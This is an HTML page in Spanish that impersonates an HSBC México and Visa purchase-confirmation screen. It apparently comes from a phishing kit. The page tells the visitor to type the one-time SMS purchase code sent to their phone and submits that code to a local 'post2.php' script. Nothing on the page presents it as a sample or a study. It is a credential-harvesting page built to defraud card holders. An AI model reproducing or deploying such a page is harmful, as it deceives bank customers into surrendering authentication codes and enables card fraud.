<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación de Compra - HSBC</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 500px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: left;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 50px;
        }
        .details p, .details h6 {
            margin: 5px 0;
        }
        .details input {
            width: 200px;
            margin-top: 10px;
        }
        .text-center a {
            text-decoration: none;
            color: #000;
            font-weight: bold;
        }
        .btn-container {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/hsbc.png" alt="HSBC">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
        </div>
        <p>Ingresa la clave enviada a tu celular (###) ###-#### y haz click en Enviar.</p>

        <p>En caso de no recibir el SMS con la clave:</p>
        <ul>
            <li>Ingresa a tu app HSBC México</li>
            <li>Da click en ayuda</li>
            <li>Contáctanos por chat y escribe "ayuda clave compra" O llama al 8003668469</li>
        </ul>

        <h6 class="text-muted">Detalle de la compra</h6>
        <form action="post2.php" method="POST">
            <div class="details">
                <p><strong>Comercio:</strong> Digital</p>
                <p><strong>Número de Tarjeta:</strong> ************</p>
                <p><strong>Ingresa la clave:</strong> <input type="text" class="form-control d-inline-block" name="clave"></p>
            </div>

            <div class="btn-container">
                <a href="#" class="d-block mb-2">Haga Click Aquí para recibir tu Clave Única de Compra</a>
                <button type="submit" class="btn btn-dark">Enviar</button>
            </div>
        </form>
        <div class="text-center mt-3">
            <a href="#">Cerrar</a>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
